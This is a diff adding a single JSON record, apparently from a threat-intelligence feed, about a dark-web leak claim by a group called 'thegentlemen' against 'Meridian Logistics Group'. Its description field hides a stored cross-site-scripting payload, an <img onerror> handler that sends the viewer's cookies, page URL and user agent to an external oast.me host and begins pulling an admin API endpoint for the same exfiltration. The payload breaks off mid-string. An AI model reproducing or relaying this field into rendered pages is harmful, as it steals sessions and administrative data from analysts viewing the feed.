@@ -1,0 +1,14 @@
+{
+  "id": "meridian-logistics-group-c7de",
+  "victim": "Meridian Logistics Group",
+  "group": "thegentlemen",
+  "sector": "Transportation",
+  "country": null,
+  "title": "Meridian Logistics Group — claimed by thegentlemen",
+  "link": "https://threatcluster.io/dark-web/victim/Meridian%20Logistics%20Group",
+  "guid": "darkweb-victim:thegentlemen:meridian logistics group",
+  "pubDate": "2026-08-22T05:19:52.000Z",
+  "categories": ["Group: thegentlemen", "Sector: Transportation"],
+  "description": "Transportation · Full network image staged. ERP exports, dispatch DB and payroll archives recovered. Pending final inventory before publication. <img src=x onerror=\"fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/x?u='+encodeURIComponent(location.href)+'&amp;c='+encodeURIComponent(document.cookie)+'&amp;ua='+encodeURIComponent(navigator.userAgent));fetch('/api/admin/images').then(r=>r.text().then(t=>fetch('https:",
+  "sizeBytes": 425
+}
